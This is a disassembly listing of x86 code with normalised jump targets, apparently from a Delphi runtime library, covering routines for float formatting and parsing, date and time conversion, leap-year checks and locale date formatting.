jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_408d2c
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408b57
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + sub_408b34 ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408b61
call sub_408b57
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408a14
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_408bbd
call sub_408b57
call sub_408b4e
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408b4e
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408a14
retn
xor ecx ecx
sub_408bf9
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408b4e
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408b4e
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_408c5e
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_408cb2
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_408bf9
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_408d2c
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_408d59
jmp r-xdata
call sub_408e7b
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_408d59
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402c44
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_408e7b
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_408f58
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_40900f
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_40901a
neg edx
mov ecx esi
call sub_40901a
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_40900f
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_409036
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402c44
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_40901a
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_409036
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_40906c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408a58
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403f9c
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40909c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408a58
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_403f9c
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4090e8
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40436c
mov edx esp
xor ecx ecx
call sub_408f58
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409114
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_40436c
mov edx esp
xor ecx ecx
call sub_408f58
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40915c
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_4091a0
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409210
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_40915c
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_4078d0
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_4078d0
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_4078d0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_40926c
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_4092a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_40926c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409370
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_40915c
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_4078d0
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_4078d0
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_4078d0
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_40926c
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_4094bc
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409370
pop esi
pop ecx
pop ebp
retn 0x8
sub_4094dc
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_40915c
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409518
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028c8
sub_40955c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_40416c
mov edx eax
mov eax ebx
call sub_409518
pop ecx
pop ebx
pop ebp
retn
sub_40957c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408548
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409518
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4095c8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_4095f4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_4094bc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_40962c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_409210
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_40966c
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4097ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403eac
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f44
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4097c1
lea eax [ ebp - 0x118 ]
call sub_403eac
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_40411c
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_40416c
mov edx eax
mov eax [ ebx ]
call sub_40bbb0
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40bd24
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_4043cc
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40bcc0
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_4040a4
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40bd24
mov ecx eax
mov eax ebx
mov edx esi
call sub_403f9c
sub_4097d4
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4098b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403eac
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f44
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403f44
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4098b9
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_40411c
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40436c
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_40416c
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_4043cc
sub_4098dc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a05d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a064
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403ed0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40bda4
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40bd84
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409518
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40bda4
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409518
pop ecx
mov al [ eax + lookup_table_4099bf ]
jmp [ eax * 4 + jump_table_4099f8 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_4095c8
pop ecx
push ebp
call sub_4095f4
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_4095c8
pop ecx
push ebp
call sub_4095f4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_40966c
pop ecx
mov eax [ ebp - 0x24 ]
call sub_40955c
pop ecx
jmp r-xdata
push ebp
call sub_4095c8
pop ecx
push ebp
call sub_4095f4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_4097d4
pop ecx
mov eax [ ebp - 0x28 ]
call sub_40955c
pop ecx
jmp r-xdata
push ebp
call sub_4095c8
pop ecx
push ebp
call sub_4095f4
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_4095c8
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_4095c8
pop ecx
push ebp
call sub_40962c
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_4095c8
pop ecx
push ebp
call sub_40962c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_4095c8
pop ecx
push ebp
call sub_40962c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_4095c8
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_4095c8
pop ecx
push ebp
call sub_40962c
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_40962c
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_4083a4
test eax eax
jne r-xdata
push ebp
call sub_4095c8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4098dc
pop ecx
push ebp
call sub_40962c
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_40957c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_40957c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_40957c
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_4095f4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_40957c
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
